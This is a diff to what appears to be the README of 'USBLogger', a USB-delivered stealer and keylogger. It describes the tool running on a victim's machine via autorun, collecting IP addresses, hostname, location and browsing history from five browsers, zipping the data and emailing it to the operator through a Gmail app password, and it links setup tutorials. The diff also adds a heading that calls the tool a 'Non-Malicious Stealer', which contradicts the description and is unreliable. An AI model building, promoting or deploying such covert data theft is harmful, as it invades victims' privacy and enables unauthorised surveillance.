@@ -150,7 +150,9 @@ Step 8: Copy The keylogger.exe To Your USB Flash Drive. And Make It Run The keyl
 # TUTORIAL FOR THE AUTORUN PROGRAM: https://www.youtube.com/watch?v=g1-Rvi6EE8s&t=117s
 
 
-# What It Does (USBLogger Original Version):
+# USBLogger (Original Edition)
+A Non-Malicious Stealer That Steals IPv4+IPv6 And Other IPs, And Browsing History From: Brave, Microsoft Edge, Opera, Google Chrome, Firefox. And System Info, And Computer Component Infos As Well.
+# What It Does (USBLogger Original Edition):
 When You/The Victim Executes It Or Plugs In The USB Flash Drive, It Will Send An Email To You (If You Follow The Instructions And Tutorials Below) With Your/The Victims IP Addresses, IPv4 and IPv6, Your/The Victims Hostname, Your/The Victims PC's Name, Your/The Victims Location, Your/The Victims Town/City, Browsing History. Brave, Edge, Google Chrome, Firefox, Aaaand Opera And Then Makes A Zip And Names It combined_data.zip And Compresses It To Make Them Under 25 Megabytes Or So.
 
 # NOTE: This Only Works With Gmail And Needs An Gmail App Password (AKA An SMTP Server API Key FROM GMAIL). Tutorial On How To Make One: https://www.youtube.com/watch?v=JDA3a8tEBlo
